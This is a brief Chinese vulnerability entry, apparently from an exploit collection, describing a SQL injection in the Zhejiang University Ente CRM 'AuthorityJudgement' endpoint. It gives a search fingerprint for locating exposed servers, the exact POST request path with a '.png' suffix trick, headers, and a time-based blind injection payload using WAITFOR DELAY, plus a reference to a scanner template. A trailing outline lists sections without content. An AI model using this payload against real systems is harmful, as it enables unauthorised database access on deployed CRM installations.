# 浙大恩特CRMAuthorityJudgement存在SQL注入漏洞

- **系统**：浙大恩特　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="浙大恩特 CRM"`
- **请求**：`POST /entsoft/PurchaseAction.entphone;.png?method=AuthorityJudgement HTTP/1.1`
- **关键头**：`Content-Length: 34`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
modNum=1';WAITFOR DELAY '0:0:1'--+

\[浙大恩特客户资源管理系统-purchaseaction-entphone--sql注入.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 浙大恩特CRM AuthorityJudgement存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 浙大恩特CRM